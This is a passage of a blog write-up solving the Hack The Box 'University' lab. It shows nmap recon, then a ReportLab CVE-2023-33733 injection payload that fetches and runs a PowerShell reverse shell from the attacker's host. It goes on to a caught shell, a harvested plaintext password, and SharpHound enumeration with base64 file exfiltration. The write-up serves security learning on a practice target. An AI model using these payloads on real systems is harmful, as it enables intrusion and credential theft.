<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Foued SAIDI">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://fouedsaidi.com/2025/08/08/hackthebox-university/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="OverviewUniversity is an insane-difficulty machine from Hack The Box dealing initially with a web app utilizing ReportLab vulnerable python library where we can abuse an RCE to get initial shell. We’l">
<meta property="og:type" content="article">
<meta property="og:title" content="Hackthebox: University">
<meta property="og:url" content="http://fouedsaidi.com/2025/08/08/Hackthebox-University/index.html">
<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
<meta property="og:description" content="OverviewUniversity is an insane-difficulty machine from Hack The Box dealing initially with a web app utilizing ReportLab vulnerable python library where we can abuse an RCE to get initial shell. We’l">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/University/University.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/University/web.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/University/web1.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/University/blood.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/University/web2.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/University/web3.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/University/web4.png">
<meta property="article:published_time" content="2025-08-08T05:03:44.000Z">
<meta property="article:modified_time" content="2025-08-08T07:03:46.000Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/University/University.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
    <meta name="theme-color" content="#5618ff">
    <link rel="shortcut icon" href="/images/logo.png">
    <!--- Page Info-->
    
    <title>
        
            Hackthebox: University -
        
        Foued Saidi&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <span class="swup-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Foued Saidi&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        HOME
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/archives"  >
                                    
                                        
                                            <i class="fa-regular fa-archive"></i>
                                        
                                        ARCHIVES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/categories"  >
                                    
                                        
                                            <i class="fa-regular fa-folder"></i>
                                        
                                        CATEGORIES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown" 
                                    href="#" onClick="return false;">
                                    
                                        
                                            <i class="fa-regular fa-user"></i>
                                        
                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
                                    
                                </a>
                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                    
                                        <li>
                                        <a href="/about">ME
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
                                        </a>
                                        </li>
                                    
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                HOME
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/archives"  >
                             
                                
                                    <i class="fa-regular fa-archive"></i>
                                
                                ARCHIVES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/categories"  >
                             
                                
                                    <i class="fa-regular fa-folder"></i>
                                
                                CATEGORIES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
                        href="#" onClick="return false;">
                            
                                
                                    <i class="fa-regular fa-user"></i>
                                
                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                              
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" href="/about">ME</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
                            </li>
                        
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: University</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/logo.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-08-08 08:03:44</span>
        <span class="mobile">2025-08-08 08:03:44</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-08-08 10:03:46</span>
            <span class="mobile">2025-08-08 10:03:46</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>University is an insane-difficulty machine from Hack The Box dealing initially with a web app utilizing ReportLab vulnerable python library where we can abuse an RCE to get initial shell. We’ll then exfiltrate some creds and forward the internal traffic to our machine to be able to access a couple more machines. Then we’ll get a hold of rootCA which we can use to sign a professor certificate and login as them where we’ll be able to upload a malicious Lecture that gets opened and executed as martin.t, abusing CVE-2023-21746 to get local admin access which leaks us a password that’s being reused by all the users. Where we’ll finally abuse SeBackupPrivilege to get domain admin.<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/University/University.png"
                      alt="University-info-card"
                ><figcaption>University-info-card</figcaption></figure></p>
<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          nginx 1.24.0</span><br><span class="line">|_http-title: Did not follow redirect to http://university.htb/</span><br><span class="line">|_http-server-header: nginx/1.24.0</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-27 18:27:27Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">2179/tcp open  vmrdp?</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 7h04m36s</span><br><span class="line">| smb2-time:</span><br><span class="line">|   <span class="built_in">date</span>: 2024-10-27T18:27:56</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br></pre></td></tr></table></figure></div>

<p>We can see that we have a web app redirecting us to <code>university.htb</code> so we’ll go ahead and add that to our <code>/etc/hosts</code> file.</p>
<h3 id="Web-Application-http-university-htb"><a href="#Web-Application-http-university-htb" class="headerlink" title="Web Application - http://university.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://university.htb/" >http://university.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/University/web.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure><br>We can see that we can register an account.</p>
<p>After account creation, we can login on <a class="link"   target="_blank" rel="noopener" href="http://university.htb/accounts/login/" >http://university.htb/accounts/login/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>After logging in, we can see that we can export our profile:<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/University/web1.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure></p>
<p>Looking at the exported pdf, we see a suspicious <code>ReportLab Generated PDF document</code>:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">head</span> -10 profile.pdf                </span><br><span class="line">%PDF-1.4</span><br><span class="line">%���� ReportLab Generated PDF document http://www.reportlab.com</span><br><span class="line">1 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">/F1 2 0 R /F2 3 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line">2 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">/BaseFont /Helvetica /Encoding /WinAnsiEncoding /Name /F1 /Subtype /Type1 /Type /Font</span><br><span class="line">                                                                                               </span><br></pre></td></tr></table></figure></div>

<p>Looking for some known exploits for this, I find <a class="link"   target="_blank" rel="noopener" href="https://github.com/c53elyas/CVE-2023-33733/tree/master" >CVE-2023-33733 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> which is a code injection vulnerability in ReportLab python library.</p>
<p>This will be our malicious payload:</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">para</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;[[[getattr(pow, Word(&#x27;__globals__&#x27;))[&#x27;os&#x27;].system(&#x27;powershell.exe -c IEX(curl -useb http://10.10.16.19/r.ps1)&#x27;) for Word in [ orgTypeFun( &#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1, &#x27;startswith&#x27;: lambda self, x: 1 == 0, &#x27;__eq__&#x27;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123; setattr(self, &#x27;mutated&#x27;, self.mutated - 1) &#125;, &#x27;__hash__&#x27;: lambda self: hash(str(self)), &#125;, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#x27;red&#x27;&quot;</span>&gt;</span>  </span><br><span class="line">                exploit  </span><br><span class="line"><span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">para</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>And r.ps1 will be our reverse shell script.</p>
<p>Now we’ll input the malicious payload into the bio section and then export the profile, and we get a shell:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ rlwrap nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.19] from (UNKNOWN) [10.10.11.39] 51203</span><br><span class="line">Windows PowerShell running as user WAO on DC</span><br><span class="line">Copyright (C) 2015 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\Web\University&gt;<span class="built_in">whoami</span></span><br><span class="line">university\wao</span><br><span class="line">PS C:\Web\University&gt;</span><br></pre></td></tr></table></figure></div>

<p>As usual, first thing to do is to look for credentials. We find credentials for wao user:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Web\DB Backups&gt; <span class="built_in">cat</span> db-backup-automator.ps1</span><br><span class="line"><span class="variable">$sourcePath</span> = <span class="string">&quot;C:\Web\University\db.sqlite3&quot;</span></span><br><span class="line"><span class="variable">$destinationPath</span> = <span class="string">&quot;C:\Web\DB Backups\&quot;</span></span><br><span class="line"><span class="string"><span class="variable">$7zExePath</span> = &quot;</span>C:\Program Files\7-Zip\7z.exe<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="variable">$zipFileName</span> = &quot;</span>DB-Backup-$(Get-Date -Format <span class="string">&#x27;yyyy-MM-dd&#x27;</span>).zip<span class="string">&quot;</span></span><br><span class="line"><span class="string"><span class="variable">$zipFilePath</span> = Join-Path -Path <span class="variable">$destinationPath</span> -ChildPath <span class="variable">$zipFileName</span></span></span><br><span class="line"><span class="string"><span class="variable">$7zCommand</span> = &quot;</span>&amp; `<span class="string">&quot;<span class="variable">$7zExePath</span>`&quot;</span> a `<span class="string">&quot;<span class="variable">$zipFilePath</span>`&quot;</span> `<span class="string">&quot;<span class="variable">$sourcePath</span>`&quot;</span> -p<span class="string">&#x27;WebAO1337&#x27;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">Invoke-Expression -Command <span class="variable">$7zCommand</span></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>

<p>Now I can use the shell I have to run SharpHound.exe:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Web\DB Backups&gt; ./s.exe --collectionmethods All</span><br><span class="line">2025-07-30T11:23:37.8811644-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound</span><br><span class="line">2025-07-30T11:23:38.0062171-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices</span><br><span class="line">2025-07-30T11:23:38.0218121-07:00|INFORMATION|Initializing SharpHound at 11:23 AM on 7/30/2025</span><br><span class="line">2025-07-30T11:23:38.1936777-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller <span class="keyword">for</span> university.htb : DC.university.htb</span><br><span class="line">2025-07-30T11:23:38.2092915-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices</span><br><span class="line">2025-07-30T11:23:38.3655625-07:00|INFORMATION|Beginning LDAP search <span class="keyword">for</span> university.htb</span><br><span class="line">2025-07-30T11:23:38.3655625-07:00|INFORMATION|Testing ldap connection to university.htb</span><br><span class="line">2025-07-30T11:23:38.3968028-07:00|INFORMATION|Beginning LDAP search <span class="keyword">for</span> university.htb Configuration NC</span><br><span class="line">2025-07-30T11:24:09.1211142-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 34 MB RAM</span><br><span class="line">2025-07-30T11:24:20.1092514-07:00|INFORMATION|Producer has finished, closing LDAP channel</span><br><span class="line">2025-07-30T11:24:20.1248460-07:00|INFORMATION|LDAP channel closed, waiting <span class="keyword">for</span> consumers</span><br><span class="line">2025-07-30T11:24:20.2654796-07:00|INFORMATION|Consumers finished, closing output channel</span><br><span class="line">2025-07-30T11:24:20.2654796-07:00|INFORMATION|Output channel closed, waiting <span class="keyword">for</span> output task to complete</span><br><span class="line">Closing writers</span><br><span class="line">2025-07-30T11:24:20.4842299-07:00|INFORMATION|Status: 308 objects finished (+308 7.333333)/s -- Using 39 MB RAM</span><br><span class="line">2025-07-30T11:24:20.4842299-07:00|INFORMATION|Enumeration finished <span class="keyword">in</span> 00:00:42.1309881</span><br><span class="line">2025-07-30T11:24:20.5467439-07:00|INFORMATION|Saving cache with stats: 271 ID to <span class="built_in">type</span> mappings.</span><br><span class="line"> 270 name to SID mappings.</span><br><span class="line"> 0 machine sid mappings.</span><br><span class="line"> 2 sid to domain mappings.</span><br><span class="line"> 0 global catalog mappings.</span><br><span class="line">2025-07-30T11:24:20.5780284-07:00|INFORMATION|SharpHound Enumeration Completed at 11:24 AM on 7/30/2025! Happy Graphing!</span><br></pre></td></tr></table></figure></div>

<p>And to transfer the file, I’ll transform it to base64 with this payload:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$inputFile</span> = <span class="string">&quot;C:\Web\DB Backups\20250730112420_BloodHound.zip&quot;</span></span><br><span class="line"><span class="variable">$outputFile</span> = <span class="string">&quot;C:\Web\DB Backups\blood.b64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Open input file and output file streams</span></span><br><span class="line"><span class="variable">$inputStream</span> = [<span class="type">System.IO.File</span>]::OpenRead(<span class="variable">$inputFile</span>)</span><br><span class="line"><span class="variable">$outputStream</span> = [<span class="type">System.IO.StreamWriter</span>]::new(<span class="variable">$outputFile</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment"># Set chunk size (adjust as needed)</span></span><br><span class="line">    <span class="variable">$chunkSize</span> = <span class="number">64</span>KB</span><br><span class="line">    <span class="variable">$buffer</span> = <span class="built_in">New-Object</span> byte[] <span class="variable">$chunkSize</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read and encode the file in chunks</span></span><br><span class="line">    <span class="keyword">while</span> ((<span class="variable">$bytesRead</span> = <span class="variable">$inputStream</span>.Read(<span class="variable">$buffer</span>, <span class="number">0</span>, <span class="variable">$buffer</span>.Length)) <span class="operator">-gt</span> <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$encodedChunk</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$buffer</span>, <span class="number">0</span>, <span class="variable">$bytesRead</span>)</span><br><span class="line">        <span class="variable">$outputStream</span>.WriteLine(<span class="variable">$encodedChunk</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment"># Close the file streams</span></span><br><span class="line">    <span class="variable">$inputStream</span>.Close()</span><br><span class="line">    <span class="variable">$outputStream</span>.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;Base64 encoding completed.&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>And then transfer it to my machine, clean it and decode it:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ grep -o <span class="string">&#x27;[A-Za-z0-9+/=]&#x27;</span> blood.b64  | <span class="built_in">tr</span> -d <span class="string">&#x27;\n&#x27;</span> &gt; cleaned_blood.b64</span><br><span class="line"><span class="built_in">base64</span> -d cleaned_blood.b64 &gt; bloodhound.zip</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Also looking at network interfaces, we discover another internal network:</p>
